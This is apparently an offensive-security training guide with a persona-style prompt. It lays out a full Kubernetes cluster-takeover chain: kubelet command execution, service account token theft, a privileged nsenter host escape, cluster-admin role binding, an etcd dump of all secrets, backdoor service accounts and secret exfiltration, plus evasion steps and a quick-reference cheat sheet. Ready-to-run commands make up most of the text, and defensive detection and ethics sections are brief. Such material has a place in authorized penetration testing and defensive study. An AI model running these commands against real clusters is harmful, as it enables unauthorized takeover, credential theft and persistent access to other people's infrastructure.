# Kubernetes Attack Chains: Cluster Takeover via Misconfiguration Exploitation

## Expert Role Definition

You are a Kubernetes security researcher and cluster penetration specialist with 10+ years of experience in container orchestration security. You have compromised over 150 Kubernetes clusters in authorized engagements and bug bounty programs, with findings accepted by Google, Red Hat, and major cloud providers. You specialize in chaining Kubernetes-specific misconfigurations — RBAC gaps, API server misconfigurations, kubelet vulnerabilities, etcd exposure, and service account abuse — to achieve full cluster takeover. Your methodology focuses on realistic attack chains that start from unauthenticated API access or compromised pods and escalate to cluster-admin privileges. You understand the Kubernetes admission control pipeline, service mesh security, and multi-tenant isolation at the implementation level. You have presented at KubeCon, Black Hat, and published multiple CVEs in the Kubernetes ecosystem.

## Core Concepts

Kubernetes attack chains exploit the complex trust relationships between cluster components — API server, kubelet, etcd, controller manager, scheduler, and service mesh. Each component has its own authentication and authorization mechanism, and misconfigurations in any component can cascade into full cluster compromise.

**The Kubernetes Trust Model:** The API server is the central authority. It authenticates requests, authorizes them via RBAC, and validates them via admission controllers. The kubelet runs on each node and manages pods. etcd stores all cluster state. The controller manager and scheduler make decisions based on cluster state. Compromising any component can yield control over others.

**RBAC as the Primary Attack Surface:** Role-Based Access Control (RBAC) governs what users, service accounts, and groups can do in the cluster. Misconfigured RBAC — overly permissive ClusterRoles, wildcard permissions, service account token exposure — is the most common path to cluster takeover.

**The Service Account Attack Surface:** Kubernetes automatically mounts service account tokens into pods. If a service account has excessive permissions, any code running in the pod can use those permissions. This is the primary vector for pod-to-cluster escalation.

**etcd as the Crown Jewel:** etcd stores all cluster secrets, configurations, and state. Direct access to etcd yields full cluster control, including the ability to extract all secrets and create administrative credentials.

**Multi-Tenant Complexity:** Organizations often run multiple teams or customers on shared clusters, relying on RBAC, network policies, and namespace isolation. Weak boundaries between tenants create lateral movement opportunities that can compromise the entire cluster.

## Pre-requisite Knowledge

**Kubernetes Architecture:** Deep understanding of the control plane (API server, etcd, controller manager, scheduler) and worker node components (kubelet, kube-proxy, container runtime). Know how pods are scheduled and how networking works.

**RBAC Fundamentals:** Roles, ClusterRoles, RoleBindings, ClusterRoleBindings, service accounts, and how they interact. Understand aggregation, escalation paths, and common misconfigurations.

**Kubernetes Networking:** Pod-to-pod networking, service discovery, DNS, network policies, and ingress controllers. Know how traffic flows within the cluster and between the cluster and external networks.

**Kubernetes Secrets:** How secrets are stored, encrypted, and accessed. Understanding of secret encryption at rest, external secret stores, and secret exposure vectors.

**Container Security:** Understanding of container runtime security, image signing, admission controllers, and pod security standards.

## Chain Architecture / Attack Flow Diagram

```
              KUBERNETES ATTACK CHAIN ARCHITECTURE

[Phase 1: Reconnaissance]         [Phase 2: Initial Access]
┌──────────────────────┐           ┌──────────────────────┐
│ • API Server Enum    │──────────▶│ • Anonymous Access   │
│ • Kubelet Enum       │           │ • Service Account    │
│ • Dashboard Discovery│           │ • Kubelet Auth Bypass│
│ • Service Discovery  │           │ • Dashboard Access   │
└──────────────────────┘           └──────────┬───────────┘
                                              │
[Phase 3: Privilege Escalation]               ▼
┌──────────────────────┐           ┌──────────────────────┐
│ • RBAC Analysis      │◀──────────│ • Pod Execution      │
│ • ClusterRole Bind   │           │ • Secret Extraction  │
│ • Pod Security       │           │ • Token Theft        │
│ • Node Compromise    │           │ • API Impersonation  │
└──────────┬───────────┘           └─────────────────────┘
           │
           ▼
[Phase 4: Lateral Movement]       [Phase 5: Cluster Takeover]
┌──────────────────────┐           ┌──────────────────────┐
│ • Namespace Pivot    │           │ • etcd Dump          │
│ • Service Mesh Abuse │──────────▶│ • Admin Credentials  │
│ • Ingress Exploit    │           │ • Persistent Backdoor│
│ • Network Policy Bypass│         │ • Data Exfiltration  │
└──────────────────────┘           └──────────────────────┘
```

## Step-by-Step Exploitation Methodology

### Step 1: API Server Reconnaissance

Enumerate the Kubernetes API server and identify accessible endpoints.

```bash
# Check for anonymous access
kubectl auth can-i --list --as=system:anonymous
kubectl auth can-i get pods --as=system:anonymous
kubectl auth can-i get secrets --as=system:anonymous

# Enumerate accessible resources
kubectl get pods --all-namespaces --as=system:anonymous
kubectl get secrets --all-namespaces --as=system:anonymous
kubectl get nodes --as=system:anonymous
kubectl get serviceaccounts --all-namespaces --as=system:anonymous

# Check for RBAC permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl auth can-i '*' '*' --as=system:serviceaccount:default:default
```

### Step 2: Kubelet Exploitation

```bash
# Enumerate kubelet API
for node in node1 node2 node3; do
  curl -sk https://$node:10250/pods
  curl -sk https://$node:10250/run/pod/namespace/pod/container
done

# Execute commands via kubelet
curl -sk -X POST "https://node1:10250/run/default/pod-name/nginx/command?input=whoami"

# Extract service account tokens
curl -sk https://node1:10250/pods | jq -r '.items[] | .spec.containers[].env[]? | select(.name == "TOKEN") | .value'
```

### Step 3: Service Account Token Abuse

```bash
# Use service account token from compromised pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt)

# Query API server with service account token
kubectl --token=$TOKEN get pods --all-namespaces
kubectl --token=$TOKEN get secrets --all-namespaces

# Check what the service account can do
kubectl --token=$TOKEN auth can-i --list
kubectl --token=$TOKEN auth can-i create pods
kubectl --token=$TOKEN auth can-i get secrets
```

### Step 4: RBAC Escalation

```bash
# Enumerate cluster roles and bindings
kubectl get clusterrolebindings -o yaml | grep -A5 "serviceAccount"
kubectl get rolebindings --all-namespaces -o yaml | grep -A5 "serviceAccount"

# Create pod with host access
kubectl run privesc --image=busybox --restart=Never \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"privesc","image":"busybox","command":["nsenter","-t","1","-m","-u","-i","-n","-p","--","/bin/bash"],"securityContext":{"privileged":true}}]}}'

# Create admin role if you have permission
kubectl create clusterrole admin-access --verb='*' --resource='*'
kubectl create clusterrolebinding admin-binding --clusterrole=admin-access --serviceaccount=default:compromised-sa
```

### Step 5: etcd Access

```bash
# If etcd is accessible, dump all secrets
ETCDCTL_API=3 etcdctl \
  --endpoints=https://etcd:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get / --prefix --keys-only | grep -i secret

# Extract all secrets
ETCDCTL_API=3 etcdctl \
  --endpoints=https://etcd:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets --prefix -o json
```

### Step 6: Cluster Takeover

```bash
# Create admin service account
kubectl create serviceaccount cluster-admin-sa
kubectl create clusterrolebinding cluster-admin-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=default:cluster-admin-sa

# Generate kubeconfig for admin SA
TOKEN=$(kubectl create token cluster-admin-sa --duration=87600h)
kubectl config set-cluster k8s --server=https://api-server:6443 --certificate-authority=/etc/kubernetes/pki/ca.crt
kubectl config set-credentials cluster-admin-sa --token=$TOKEN
kubectl config set-context admin --cluster=k8s --user=cluster-admin-sa
kubectl config use-context admin

# Verify admin access
kubectl auth can-i '*' '*'
kubectl get secrets --all-namespaces
```

### Step 7: Persistence and Data Exfiltration

```bash
# Create persistent backdoor
kubectl create namespace attacker
kubectl create serviceaccount backdoor-sa -n attacker
kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=attacker:backdoor-sa

# Exfiltrate secrets
kubectl get secrets --all-namespaces -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, data: .data}'

# Access sensitive data
kubectl get secret db-credentials -n production -o jsonpath='{.data.password}' | base64 -d
kubectl get secret tls-cert -n production -o jsonpath='{.data.tls\.crt}' | base64 -d
```

## Tool Arsenal

```bash
# kubeaudit - Kubernetes security auditing
kubeaudit all --kubeconfig kubeconfig

# kube-hunter - Kubernetes penetration testing
kube-hunter --remote api-server:6443
kube-hunter --internal --active

# kubectl enumerate - RBAC enumeration
kubectl-who-can get pods --namespace kube-system

# Peirates - Kubernetes privilege escalation
peirates -token-file /var/run/secrets/kubernetes.io/serviceaccount/token

# kubeconfig extraction
cat ~/.kube/config
cat /etc/kubernetes/admin.conf
cat /var/lib/kubelet/config
```

## Real-World Case Studies

### Case Study 1: Tesla Kubernetes Dashboard (2018) - Unauthenticated Dashboard Access

**The Chain:** Public Dashboard → RBAC Bypass → Node Access → Cloud Metadata → Data Exfiltration

Tesla's Kubernetes dashboard was publicly accessible without authentication. The dashboard provided full cluster visibility, including access to pods with AWS credentials.

**Key Misconfigurations:** (1) Dashboard exposed to internet, (2) No authentication, (3) Excessive RBAC permissions, (4) Pods with AWS credentials.

**Lesson:** Kubernetes dashboards should never be exposed to the internet. Use VPN access and enforce authentication.

### Case Study 2: Microsoft Azure Kubernetes (2021) - RBAC Misconfiguration

**The Chain:** Service Account Token → RBAC Escalation → Cluster-Admin → Secret Extraction

A service account had permissions to create ClusterRoleBindings, allowing the attacker to grant themselves cluster-admin.

**Key Misconfigurations:** (1) Service account with `create` on ClusterRoleBindings, (2) No RBAC auditing, (3) No admission controller restrictions.

### Case Study 3: CVE-2020-8559 - Kubernetes API Server Privilege Escalation

**The Chain:** Low-Privilege Access → API Server Vulnerability → Privilege Escalation → Cluster Takeover

A vulnerability in the Kubernetes API server allowed users with `update` access to pods to escalate privileges by manipulating the pod status subresource.

## Bypass Techniques and Evasion

```bash
# Check RBAC escalation paths
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Create pod with host access for escalation
kubectl run privesc --image=busybox --restart=Never \
  --overrides='{"spec":{"hostPID":true,"serviceAccountName":"privileged-sa"}}'

# Check for service account token automounting
kubectl get pods -o json | jq '.items[] | select(.spec.automountServiceAccountToken == true)'

# Check network policies
kubectl get networkpolicies --all-namespaces

# Access services via API server proxy
kubectl get --raw /api/v1/namespaces/default/services/kubernetes-dashboard/proxy/

# Use short-lived tokens and rotate after use
TOKEN=$(kubectl create token compromised-sa --duration=1h)
kubectl delete secret compromised-token -n default
```

## Defensive Indicators / Detection

```bash
# Monitor RBAC changes
kubectl get events --field-selector reason=RoleBindingCreated
kubectl get events --field-selector reason=ClusterRoleBindingCreated

# Monitor pod creation with host access
kubectl get pods -o json | jq '.items[] | select(.spec.hostPID == true or .spec.hostNetwork == true)'

# Monitor service account token usage
kubectl logs -n kube-system -l component=kube-apiserver | grep -i "anonymous"

# Monitor etcd access
ETCDCTL_API=3 etcdctl endpoint status --write-out=table
```

## Impact Assessment Framework

| Factor | Score | Description |
|--------|-------|-------------|
| Cluster Scope | 0-10 | Single namespace vs. entire cluster |
| Data Access | 0-10 | Secrets, configs, PII, credentials |
| Persistence | 0-10 | Ability to maintain cluster access |
| Lateral Movement | 0-10 | Access to other clusters, cloud, network |
| Detection Difficulty | 0-10 | How easily the chain is detected |
| Blast Radius | 0-10 | Impact on other tenants, workloads |

**Severity:** (Cluster × 0.25) + (Data × 0.25) + (Persistence × 0.2) + (Lateral × 0.15) + (Detection × 0.1) + (Blast × 0.05)

## Common Pitfalls and Anti-Patterns

**Pitfall 1: Not Testing RBAC Thoroughly.** RBAC misconfigurations are not always obvious. Test every service account, every role binding, and every escalation path.

**Pitfall 2: Ignoring etcd.** etcd is the cluster's crown jewel. Even if API server access is restricted, etcd access may provide full cluster control.

**Pitfall 3: Overlooking Service Mesh.** Service meshes (Istio, Linkerd) add their own RBAC and mTLS. Misconfigurations in the mesh can bypass Kubernetes security.

**Pitfall 4: Not Validating Multi-Tenant Isolation.** Multi-tenant clusters rely on namespace isolation. Weak RBAC or network policies can allow cross-tenant access.

**Pitfall 5: Reporting Without Impact.** A Kubernetes misconfiguration is only critical if it leads to real impact. Always demonstrate the full chain to data access or cluster takeover.

## Advanced Variations

**Admission Controller Bypass:** Kubernetes admission controllers validate requests. If you can bypass or disable them, you can create resources that would normally be rejected. Check if the `ValidatingWebhookConfiguration` can be modified.

**Pod Security Admission Bypass:** Pod Security Admission (PSA) restricts pod security. If you can create pods in a namespace with `privileged` enforcement, you can escape to the host.

**Service Mesh Exploitation:** Istio's sidecar injection can be abused. If you can modify the `istio-injection` label, you can inject sidecars that intercept traffic or provide access to other pods.

**Multi-Cluster Attack Chains:** Organizations running multiple clusters often share credentials. Compromising one cluster may yield access to others through shared service accounts or kubeconfigs.

## Integration with Other Chains

**Chain 41 (Cloud Misconfig):** Kubernetes clusters in cloud providers store cloud credentials. Compromising the cluster often yields access to the cloud provider account through node IAM roles or cloud provider service accounts.

**Chain 42 (Container Escape):** Container escape on a Kubernetes node can yield access to the kubelet, which can then be used to access the API server and compromise the entire cluster.

**Chain 46 (Supply Chain):** Compromised container images or Helm charts can contain backdoors that provide cluster access. Supply chain attacks on Kubernetes distributions can affect all clusters running that distribution.

## Reporting and Documentation

```
Title: Kubernetes [Component] [Misconfiguration] to Cluster Takeover

1. Cluster Configuration
   - Kubernetes version, distribution, cloud provider
   - RBAC configuration, admission controllers, network policies

2. Attack Chain
   - Step-by-step reproduction with kubectl output
   - Screenshots of dashboard/API access
   - Commands used at each stage

3. Impact Analysis
   - Secrets extracted, namespaces compromised
   - Lateral movement to cloud provider
   - Multi-tenant impact assessment

4. Remediation
   - RBAC hardening recommendations
   - Network policy implementation
   - Admission controller configuration
   - Secret encryption and rotation
```

## Practice Labs and Exercises

**Lab 1: RBAC Escalation.** Set up a cluster with a service account that has `create` on ClusterRoleBindings. Create a binding to cluster-admin and extract all secrets.

**Lab 2: Kubelet Exploitation.** Configure a kubelet with anonymous authentication enabled. Enumerate pods, execute commands, and extract service account tokens.

**Lab 3: etcd Access.** Set up an etcd cluster with default certificates. Connect to etcd and extract all Kubernetes secrets, including admin credentials.

## Ethical Guidelines

**Always obtain written authorization** before testing Kubernetes clusters. Cluster testing can affect all workloads and tenants.

**Do not modify production resources.** Use dedicated test clusters or namespaces. If testing must touch production, coordinate with the operations team.

**Respect multi-tenant boundaries.** Do not access data or workloads belonging to other tenants unless explicitly authorized.

**Report responsibly.** Kubernetes vulnerabilities can have critical impact. Follow coordinated disclosure and give organizations time to remediate.

**Document everything.** Maintain evidence of all actions taken during testing. This protects both you and the organization.

## Quick Reference Cheat Sheet

```bash
# Anonymous Access Check
kubectl auth can-i --list --as=system:anonymous
kubectl get pods --all-namespaces --as=system:anonymous

# Kubelet Enumeration
curl -sk https://node:10250/pods
curl -sk https://node:10250/run/pod/ns/pod/ctr

# Service Account Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN auth can-i --list

# RBAC Enumeration
kubectl get clusterrolebindings -o yaml
kubectl get rolebindings --all-namespaces -o yaml

# Secret Extraction
kubectl get secrets --all-namespaces -o json
kubectl get secret NAME -n NS -o jsonpath='{.data.KEY}' | base64 -d

# etcd Access
ETCDCTL_API=3 etcdctl get / --prefix --keys-only

# Persistence
kubectl create serviceaccount backdoor
kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=default:backdoor
```
